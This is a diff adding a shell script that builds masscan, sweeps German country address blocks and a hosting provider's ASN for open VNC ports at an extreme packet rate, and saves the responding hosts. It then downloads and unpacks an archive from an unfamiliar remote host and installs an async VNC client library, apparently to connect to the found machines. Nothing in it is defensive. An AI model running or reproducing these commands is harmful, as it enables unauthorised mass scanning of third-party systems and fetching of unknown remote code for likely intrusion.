@@ -1,0 +1,14 @@
+apt update && apt -y install sudo git gcc make libpcap-dev jq
+git clone https://github.com/robertdavidgraham/masscan && cd masscan && make && sudo make install
+sudo masscan -p5900-5930 -iL rs.txt --rate 100000000 --exclude 255.255.255.255 --open-only --sendq -oG a.txt && grep "open" a.txt | awk '{split($7, a, "/"); print $4 ":" a[1]}' > ips.txt && rm a.txt
+
+
+apt update && apt -y install sudo git gcc make libpcap-dev jq python3-venv
+apt install sudo python3-venv jq -y
+
+curl https://www.ipdeny.com/ipblocks/data/countries/de.zone > rs.txt
+curl -s -X POST yj.qlbv.vn:10296/get_routes -d "asn=24940" | jq -r '.routes[]' > rs.txt
+python3 -m venv env && source env/bin/activate
+curl -O yj.qlbv.vn:10296/a.zip && unzip -x a.zip && mkdir -p input
+rm output/results.txt && mv ips.txt input
+pip install pillow httpx dotenv asyncvnc
